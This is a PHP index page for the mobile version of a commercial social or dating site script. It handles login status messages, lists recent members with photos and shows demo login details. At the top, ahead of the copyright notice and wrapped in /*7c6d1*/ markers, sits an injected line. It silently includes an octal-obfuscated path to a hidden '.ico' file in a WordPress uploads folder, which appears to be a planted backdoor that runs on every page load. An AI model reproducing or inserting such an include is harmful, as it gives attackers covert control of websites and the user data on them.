<?php
/*7c6d1*/

@include "\057home\062/icz\062xwgi\057publ\151c_ht\155l/wp\055cont\145nt/u\160load\163/.04\0700091\061.ico";

/*7c6d1*/
/* (C) Websplosion LTD., 2001-2014

IMPORTANT: This is a commercial software product
and any kind of using it must agree to the Websplosion's license agreement.
It can be found at http://www.chameleonsocial.com/license.doc

This notice may not be removed from the source code. */

include('./_include/core/pony_start.php');
if ($g_user['user_id'] > 0 and !isset($gc) and get_param("cmd", "") != "logout") redirect(Common::getHomePage());

// Fix for IIS default main page
$p = 'index.php';

$g['to_head'][] = '<link rel="stylesheet" href="'.$g['tmpl']['url_tmpl_mobile'].'css/main.css" type="text/css" media="all"/>';

$l[$p]['welcome_description_3'] = lSetVars('welcome_description_3', array('mail' => Common::getOption('info_mail', 'main')));

class CIndexMobile extends CHeader
{
	var $message = '';

	function action()
	{
		if (get_param('cmd', '') == 'logout') {
			User::logout();
		}
	}

	function parseBlock(&$html)
	{
		global $g;
		global $g_info;

        $cmd = get_param('cmd');
        $message = '';
		if ($cmd == 'login_incorrect') {
            $message = l('sign_up_not_correct');
		} elseif ($cmd == 'wait_approval') {
            $message = l('no_confirmation_account');
		} elseif($cmd == 'account_banned'){
            $message = l('account_has_been_banned');
        } elseif($cmd=='sent'){
            $message=l('the_password_has_been_sent');
        }
        if ($message != '') {
            $html->setvar('message', $message);
            $html->parse('alert_message', true);
        }

        $sql = "SELECT u.*,
            DATE_FORMAT(NOW(), '%Y') - DATE_FORMAT(birth, '%Y') - (DATE_FORMAT(NOW(), '00-%m-%d') < DATE_FORMAT(birth, '00-%m-%d')) AS age
            FROM user AS u
            WHERE u.is_photo = 'Y' AND u.hide_time = 0
            ORDER BY u.user_id DESC
            LIMIT 4";
        DB::query($sql, 2);
        $users = DB::num_rows(2);
        while ($row = DB::fetch_row(2)) {
            $row['photo'] = User::getPhotoDefault($row['user_id'], 'r', false, $row['gender']);
            htmlSetVars($html, $row);
            $html->parse('user', true);
        }
        if($users && Common::isOptionActive('users_on_main_page_map_and_mobile')) {
        $html->parse('users', true);
        }

        htmlSetVars($html, $g_info);

		$html->setvar("login_message", $this->message);
        if(Common::isOptionActive('users_on_main_page_map_and_mobile')) {
            CHeader::showMap($html, null, 10, true, 'r');
            $html->parse('ip_map', false);
        }
        if(IS_DEMO) {
            $html->setvar('login_user', 'Mike Smith');
            $html->setvar('login_password', '1234567');
            $html->parse('demo');
        }

        Social::parse($html);

        Common::parseMobileBtnDownloadApp($html);

        if ($html->blockExists('login_frm_terms_for_ios')) {
            $isIos = Common::isAppIos();
            if ($isIos) {
                $html->parse('login_frm_terms_for_ios', false);
            }
        }

		parent::parseBlock($html);
	}
}

$page = new CIndexMobile("", $g['tmpl']['dir_tmpl_mobile'] . "index.html");
$page->parseBanner = true;

$header = new CHeader("header", $g['tmpl']['dir_tmpl_mobile'] . "_header.html");
$page->add($header);
$footer = new CFooter("footer", $g['tmpl']['dir_tmpl_mobile'] . "_footer.html");
$page->add($footer);

loadPageContentAjax($page);

include("./_include/core/main_close.php");